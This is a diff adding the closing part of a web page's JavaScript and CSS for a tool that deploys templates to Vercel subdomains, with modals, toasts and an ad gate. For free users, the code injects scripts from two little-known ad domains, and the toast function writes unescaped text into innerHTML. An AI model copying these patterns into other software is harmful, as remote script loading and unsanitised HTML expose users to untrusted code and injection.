+    function loadCustomFile(input) {
+        if (!input.files[0]) return;
+        const reader = new FileReader();
+        reader.onload = e => editor.setValue(e.target.result);
+        reader.readAsText(input.files[0]);
+    }
+
+
+    function showSuccessModal(url) {
+        const modal = document.getElementById('success-modal');
+        const urlEl = document.getElementById('deployed-url');
+        urlEl.innerText = url;
+        urlEl.href = url;
+        modal.style.display = 'flex';
+        setTimeout(() => modal.classList.add('show'), 10);
+    }
+    function closeSuccessModal() {
+        const modal = document.getElementById('success-modal');
+        modal.style.display = 'none';
+        document.getElementById('subdomain').value = '';
+        document.getElementById('fragment').value = '';
+        document.getElementById('final-url-preview').innerText = 'https://{subdomain}.vercel.app/#{fragment}';
+        document.getElementById('url-preview').innerHTML = '';
+        document.getElementById('fragment-preview').innerHTML = '';
+        document.querySelectorAll('.template-card').forEach(c => c.classList.remove('selected'));
+        document.getElementById('selectedTemplateName').value = '';
+        const directUrlContainer = document.getElementById('template-direct-url-container');
+        if (directUrlContainer) directUrlContainer.classList.add('hidden');
+    }
+    function copyDeployedUrl() {
+        const url = document.getElementById('deployed-url').innerText;
+        navigator.clipboard.writeText(url);
+        showToast("URL copied to clipboard");
+    }
+    function checkDeployAd() {
+        if (!localStorage.getItem('deploy_ad_pass') && userPlan === 'free') {
+            document.getElementById('ad-overlay').style.display = 'flex';
+            const s1 = document.createElement('script'); s1.innerHTML = `(function(s){s.dataset.zone='10588048',s.src='https://gizokraijaw.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`;
+            document.body.appendChild(s1);
+            const s2 = document.createElement('script'); s2.innerHTML = `(function(s){s.dataset.zone='10588040',s.src='https://nap5k.com/tag.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`;
+            document.body.appendChild(s2);
+        }
+    }
+    function unlockDeploy() {
+        localStorage.setItem('deploy_ad_pass', 'true');
+        document.getElementById('ad-overlay').style.display = 'none';
+        showToast("Ad completed. You may deploy now.", "success");
+    }
+
+    function clearResidualData() {
+        localStorage.clear();
+        sessionStorage.clear();
+        window.location.href = 'index.html';
+    }
+
+    function showUnauthorizedModal() {
+        const modal = document.getElementById('unauthorized-modal');
+        if (modal) modal.classList.remove('hidden');
+    }
+
+    loadUserInfo();
+    window.setMode = setMode;
+    window.deploy = deploy;
+    window.updatePreview = updatePreview;
+    window.loadCustomFile = loadCustomFile;
+    window.openPreview = openPreview;
+    window.selectTemplate = selectTemplate;
+    window.unlockDeploy = unlockDeploy;
+    window.copyDeployedUrl = copyDeployedUrl;
+    window.closeSuccessModal = closeSuccessModal;
+</script>
+
+<style>
+/* Toast Container */
+#toast-container {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    z-index: 9999;
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+}
+
+/* Toast Element */
+.custom-toast {
+    background: rgba(17, 17, 17, 0.9);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    color: white;
+    padding: 16px 24px;
+    border-radius: 8px;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    opacity: 0;
+    transform: translateX(100%);
+    transition: opacity 0.3s ease, transform 0.3s ease;
+}
+
+.custom-toast.show {
+    opacity: 1;
+    transform: translateX(0);
+}
+
+.custom-toast.success { border-left: 4px solid #17c964; }
+.custom-toast.error { border-left: 4px solid #f31260; }
+.custom-toast.warning { border-left: 4px solid #f5a524; }
+</style>
+<div id="toast-container"></div>
+<script>
+function showToast(message, type = 'success') {
+    if (message && message.toLowerCase().includes('unauthorized')) {
+        showUnauthorizedModal();
+    }
+    const container = document.getElementById('toast-container');
+    const toast = document.createElement('div');
+    toast.className = `custom-toast ${type}`;
+
+    let icon = '✅';
+    if(type === 'error') icon = '❌';
+    if(type === 'warning') icon = '⚠️';
+
+    toast.innerHTML = `<span>${icon}</span> <span style="flex:1;">${message}</span> <button onclick="this.parentElement.remove()" style="background:transparent;border:none;color:white;cursor:pointer;font-size:16px;margin-left:10px;">✕</button>`;
+    container.appendChild(toast);
+
+    setTimeout(() => {
+        toast.classList.add('show');
+    }, 10);
+
+    // Auto-dismissal removed per requirements
+}
+</script>
+
+<script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/v31edd6df95cf4e85bb4c19e7a9bdbcba1788362987495" integrity="sha512-iIg7k2xntmwu6/uSb5tpc/hySgZc4eoL31yB29W6tJFo2akwjPWcEqnCEdJvGexCL0KEQwVYv5BlowfhVz26hg==" data-cf-beacon='{"version":"2024.11.0","token":"5f1c67be3bca4afc8861b488f1c80fa7","r":1,"spa":2}' crossorigin="anonymous"></script>
+</body>
+</html>
